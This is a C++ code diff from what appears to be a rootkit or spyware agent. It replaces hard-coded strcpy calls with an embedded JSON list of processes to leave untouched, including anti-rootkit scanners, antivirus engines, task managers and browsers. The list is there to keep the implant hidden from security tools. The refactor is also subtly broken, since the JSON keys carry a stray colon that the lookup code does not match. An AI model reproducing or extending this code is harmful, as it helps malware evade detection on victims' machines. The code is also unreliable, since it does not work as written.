@@ -5,6 +5,37 @@
 #include "H4-DLL.h"
 #include "LOG.h"
 
+const char* bypass_json_list = R"(
+[
+	{ "processName:": "outlook.exe", "description": "*Outlook*"},
+	{ "processName:": "ielowutil.exe" },
+	{ "processName:": "TaskMan.exe", "description": "Security Task Manager" },
+	{ "processName:": "hackmon.exe", "description": "Detects*rootkits*"},
+	{ "processName:": "hiddenfinder.exe", "description": "*Hidden*Process*Finder*" },
+	{ "processName:": "Unhackme.exe", "description": "Detects*rootkits*" },
+	{ "processName:": "fsbl.exe", "description" : "*Secure*BlackLight*"},
+	{ "processName:": "sargui.exe", "description" : "Sophos Anti*Rootkit*" },
+	{ "processName:": "avgarkt.exe", "description" : "AVG Anti*Rootkit*" },
+	{ "processName:": "avscan.exe" },
+	{ "processName:": "RootkitRevealer.exe", "description": "Rootkit detection utility*"},
+	{ "processName:": "taskmgr.exe" },
+	{ "processName:": "avgscanx.exe" },
+	{ "processName:": "IceSword.exe" },
+	{ "processName:": "rku*.exe" },
+	{ "processName:": "pavark.exe", "description": "*pavark*" },
+	{ "processName:": "avp.exe" },
+	{ "processName:": "bgscan.exe" },
+	{ "processName:": "FlashPlayerPlugin_*.exe" },
+	{ "processName:": "avk.exe" },
+	{ "processName:": "k7*.exe" },
+	{ "processName:": "rootkitbuster*.exe", "description":"Trend Micro RootkitBuster*"},
+	{ "processName:": "pcts*.exe" },
+	{ "processName:": "iexplore.exe", "description":"*Internet Explorer*" },
+	{ "processName:": "chrome.exe", "description":"*Google*Chrome*"},
+	{ "processName:": "fsm32.exe", "description": "*F-Secure Settings*"}
+]
+)";
+
 // Usata per lockare il file di conf
 HANDLE conf_file_handle = NULL;
 
@@ -108,6 +139,25 @@ void WINAPI ParseDriverHandling(JSONObject conf_json, DWORD dummy)
 }
 
 
+static void setup_bypass_list()
+{
+	JSONValue* value = JSON::Parse(bypass_json_list);
+	if (value != NULL && value->IsArray()) {
+		JSONArray arr = value->AsArray();
+		for (int i = 0; i < arr.size(); i++) {
+			JSONObject& obj = const_cast<JSONObject&>(arr[i]->AsObject());
+			sprintf_s(shared.process_bypass_list[i], "%S", obj[L"processName"]->AsString().c_str());
+
+			if (obj[L"description"] != NULL) {
+				wcscpy(shared.process_bypass_desc[i], obj[L"description"]->AsString().c_str());
+			}
+			//strcpy(shared.process_bypass_list[i], r[L"processName"].
+		}
+	}
+
+	delete value;
+
+}
 // Legge le configurazioni globali
 void HM_UpdateGlobalConf()
 {
@@ -122,53 +172,9 @@ void HM_UpdateGlobalConf()
 	// Lista di processi da non toccare
 	shared.process_bypassed = EMBEDDED_BYPASS;
 	ZeroMemory(shared.process_bypass_list, sizeof(shared.process_bypass_list));
-	strcpy(shared.process_bypass_list[0], "outlook.exe");
-	strcpy(shared.process_bypass_list[1], "ielowutil.exe");
-	//strcpy(process_bypass_list[2],"KProcCheck.exe");
-	strcpy(shared.process_bypass_list[3], "TaskMan.exe");
-	strcpy(shared.process_bypass_list[4], "hackmon.exe");
-	strcpy(shared.process_bypass_list[5], "hiddenfinder.exe");
-	strcpy(shared.process_bypass_list[6], "Unhackme.exe");
-	//strcpy(process_bypass_list[7],"blbeta.exe");
-	strcpy(shared.process_bypass_list[8], "fsbl.exe");
-	strcpy(shared.process_bypass_list[9], "sargui.exe");
-	strcpy(shared.process_bypass_list[10], "avgarkt.exe");
-	strcpy(shared.process_bypass_list[11], "avscan.exe");
-	strcpy(shared.process_bypass_list[12], "RootkitRevealer.exe");
-	strcpy(shared.process_bypass_list[13], "taskmgr.exe");
-	strcpy(shared.process_bypass_list[14], "avgscanx.exe");
-	strcpy(shared.process_bypass_list[15], "IceSword.exe");
-	//strcpy(process_bypass_list[16],"svv.exe");
-	strcpy(shared.process_bypass_list[17], "rku*.exe");
-	strcpy(shared.process_bypass_list[18], "pavark.exe");
-	strcpy(shared.process_bypass_list[19], "avp.exe");
-	strcpy(shared.process_bypass_list[20], "bgscan.exe");
-	strcpy(shared.process_bypass_list[21], "FlashPlayerPlugin_*.exe");
-	strcpy(shared.process_bypass_list[22], "avk.exe");
-	strcpy(shared.process_bypass_list[23], "k7*.exe");
-	strcpy(shared.process_bypass_list[24], "rootkitbuster*.exe");
-	strcpy(shared.process_bypass_list[25], "pcts*.exe");
-	strcpy(shared.process_bypass_list[26], "iexplore.exe");
-	strcpy(shared.process_bypass_list[27], "chrome.exe");
-	strcpy(shared.process_bypass_list[28], "fsm32.exe");
-	// XXX Se ne aggiungo, ricordarsi di modificare EMBEDDED_BYPASS
-
-	// Gestisco le descrizioni per i processi per cui le ho
 	ZeroMemory(shared.process_bypass_desc, sizeof(shared.process_bypass_desc));
-	wcscpy(shared.process_bypass_desc[0], L"*Outlook*");
-	wcscpy(shared.process_bypass_desc[3], L"Security Task Manager");
-	wcscpy(shared.process_bypass_desc[4], L"Detects*rootkits*");
-	wcscpy(shared.process_bypass_desc[5], L"*Hidden*Process*Finder*");
-	wcscpy(shared.process_bypass_desc[6], L"Detects*rootkits*");
-	wcscpy(shared.process_bypass_desc[8], L"*Secure*BlackLight*");
-	wcscpy(shared.process_bypass_desc[9], L"Sophos Anti*Rootkit*");
-	wcscpy(shared.process_bypass_desc[10], L"AVG Anti*Rootkit*");
-	wcscpy(shared.process_bypass_desc[12], L"Rootkit detection utility*");
-	wcscpy(shared.process_bypass_desc[18], L"*pavark*");
-	wcscpy(shared.process_bypass_desc[24], L"Trend Micro RootkitBuster*");
-	wcscpy(shared.process_bypass_desc[26], L"*Internet Explorer*");
-	wcscpy(shared.process_bypass_desc[27], L"*Google*Chrome*");
-	wcscpy(shared.process_bypass_desc[28], L"*F-Secure Settings*");
+	
+	setup_bypass_list();	// get from json array attributes
 
 	// Legge il delta date dal file di stato...
 	Log_RestoreAgentState(PM_CORE, (BYTE*)&date_delta, sizeof(date_delta));
